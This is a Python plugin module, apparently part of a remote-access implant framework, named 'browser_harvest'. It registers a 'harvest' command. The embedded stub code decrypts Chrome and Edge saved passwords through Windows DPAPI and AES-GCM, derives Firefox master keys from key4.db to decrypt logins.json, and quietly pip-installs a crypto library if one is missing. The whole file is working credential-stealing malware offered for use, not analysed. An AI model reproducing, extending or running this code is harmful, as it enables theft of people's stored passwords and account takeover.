PLUGIN = {"name": "browser_harvest", "desc": "Extract saved passwords/cookies from Chrome, Edge, Firefox", "deps": ["cryptography"], "size": 6.0}

STUB_CODE = r"""
def _aes_gcm_decrypt(key, data, aad=None):
    if isinstance(data, bytes) and data[:3] == b"v10": data = data[3:]
    nonce, ct, tag = data[:12], data[12:-16], data[-16:]
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        return AESGCM(key).decrypt(nonce, ct + tag, aad)
    except ImportError:
        try:
            from Crypto.Cipher import AES
            c = AES.new(key, AES.MODE_GCM, nonce=nonce)
            if aad: c.update(aad)
            return c.decrypt_and_verify(ct, tag)
        except ImportError:
            try:
                import subprocess, sys
                subprocess.run([sys.executable, "-m", "pip", "install", "cryptography", "-q"], timeout=30)
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                return AESGCM(key).decrypt(nonce, ct + tag, aad)
            except: return None

def _decrypt_key(ek):
    try:
        import ctypes; from ctypes import wintypes
        class B(ctypes.Structure): _fields_ = [("s", wintypes.DWORD), ("d", ctypes.POINTER(ctypes.c_byte))]
        kb = base64.b64decode(ek)
        if kb[:5] == b"DPAPI": kb = kb[5:]
        bi = B(len(kb), ctypes.cast(kb, ctypes.POINTER(ctypes.c_byte))); bo = B()
        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(bi), None, None, None, None, 0, ctypes.byref(bo)):
            r = ctypes.string_at(bo.d, bo.s); ctypes.windll.kernel32.LocalFree(bo.d); return r
    except: return None

def _ff_key(profile):
    k4 = os.path.join(profile, "key4.db")
    lf = os.path.join(profile, "logins.json")
    if not os.path.isfile(k4) or not os.path.isfile(lf): return None
    try:
        import sqlite3, hashlib
        conn = sqlite3.connect(k4)
        gs = conn.execute("SELECT item1 FROM metadata WHERE id=1").fetchone()
        if not gs: conn.close(); return None
        gs = gs[0]
        row = conn.execute("SELECT a11, a102 FROM nssPrivate WHERE id=1").fetchone()
        conn.close()
        if not row: return None
        a11, a102 = row
        if not a11 or not a102: return None
        hp = hashlib.sha1(gs + b"\x00").digest()[:20]
        chp = hashlib.sha1(hp).digest()[:20]
        k1 = hashlib.sha1(chp + gs).digest()[:20]
        tk = hashlib.sha1(gs + chp).digest()[:20]
        k2 = hashlib.sha1(tk + chp).digest()[:20]
        wk = k1[:16]
        import struct
        d = a11
        if d[0] == 0x30:
            o = 2 + (d[1] & 0x7f) if d[1] & 0x80 else 2
            if d[o] == 0x04:
                o += 2 + (d[o+1] & 0x7f) if d[o+1] & 0x80 else 2
            while o < len(d) and d[o] != 0x04:
                o += 1
            if o < len(d):
                o += 2 + (d[o+1] & 0x7f) if d[o+1] & 0x80 else 2
                d = d[o:]
        mk = _aes_gcm_decrypt(wk, d, a102)
        if mk is None:
            wk = (k1 + k2)[:24]
            mk = _aes_gcm_decrypt(wk, d, a102)
        return mk
    except: return None

def _ff_decrypt(mk, val):
    if not mk or not val: return ""
    try:
        d = base64.b64decode(val)
        r = _aes_gcm_decrypt(mk, d)
        if r: return r.decode(errors="replace")
    except: pass
    return "[encrypted]"

def _harvest_chrome(path):
    try:
        import sqlite3, shutil, tempfile
        ls = os.path.join(path, "Local State")
        if not os.path.isfile(ls): return []
        with open(ls) as f: state = json.load(f)
        ek = state.get("os_crypt", {}).get("encrypted_key", "")
        if not ek: return []
        mk = _decrypt_key(ek)
        if not mk: return []
        creds = []
        for entry in os.listdir(path):
            db = os.path.join(path, entry, "Login Data")
            if not os.path.isfile(db): continue
            tmp = tempfile.mktemp(suffix=".db")
            try:
                shutil.copy2(db, tmp)
                for row in sqlite3.connect(tmp).execute("SELECT origin_url, username_value, password_value FROM logins"):
                    if not row[2]: continue
                    p = _aes_gcm_decrypt(mk, row[2])
                    if p:
                        creds.append({"url": row[0][:120], "user": row[1], "pass": p.decode(errors="replace")})
                    else:
                        creds.append({"url": row[0][:120], "user": row[1], "pass": "[encrypted]"})
            except: pass
            finally:
                try: os.remove(tmp)
                except: pass
        return creds
    except: return []

def _cmd_harvest(m):
    r = {"passwords": [], "cookies": []}
    if platform.system() == "Windows":
        local = os.environ.get("LOCALAPPDATA", "")
        for b, p in [("Chrome", os.path.join(local, "Google", "Chrome", "User Data")),
                     ("Edge", os.path.join(local, "Microsoft", "Edge", "User Data"))]:
            if os.path.isdir(p):
                mk = None
                for c in _harvest_chrome(p):
                    c["browser"] = b; r["passwords"].append(c)
    base = {"Windows": os.environ.get("APPDATA", ""), "Linux": os.path.expanduser("~/.mozilla/firefox"),
            "Darwin": os.path.expanduser("~/Library/Application Support/Firefox/Profiles")}.get(platform.system(), "")
    if os.path.isdir(base):
        for prof in sorted(os.listdir(base)):
            fp = os.path.join(base, prof)
            lf = os.path.join(fp, "logins.json")
            if not os.path.isfile(lf): continue
            mk = _ff_key(fp)
            if not mk: continue
            try:
                with open(lf) as f: data = json.load(f)
                for item in data.get("logins", []):
                    r["passwords"].append({"browser": "Firefox", "url": item.get("hostname","")[:120], "user": _ff_decrypt(mk, item.get("encryptedUsername","")), "pass": _ff_decrypt(mk, item.get("encryptedPassword",""))})
            except: pass
    r["total"] = len(r["passwords"])
    return {"data": r}
_CMDS["harvest"] = _cmd_harvest
"""

def get_commands():
    return {"harvest": "_cmd_harvest"}
